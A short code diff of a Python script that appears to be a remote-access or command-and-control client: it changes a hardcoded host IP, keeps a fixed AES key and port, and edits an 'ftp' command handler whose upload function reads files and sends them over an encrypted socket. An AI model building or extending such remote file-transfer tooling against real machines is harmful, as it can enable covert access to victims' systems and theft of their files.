@@ -6,7 +6,7 @@ import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
 
-HOST = "192.168.30.52"
+HOST = "192.168.140.65"
 PORT = 6565
 aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
 
@@ -112,7 +112,7 @@ def ftp(command,client):
 
     def upload(file,client):
         try:
-            file = read(f"{file}")
+            file = read(f"./{file}")
             parse_file =parse_chunks(file)
             client.send(str(len(parse_file)).encode('utf-8'))
             client.recv(409600)
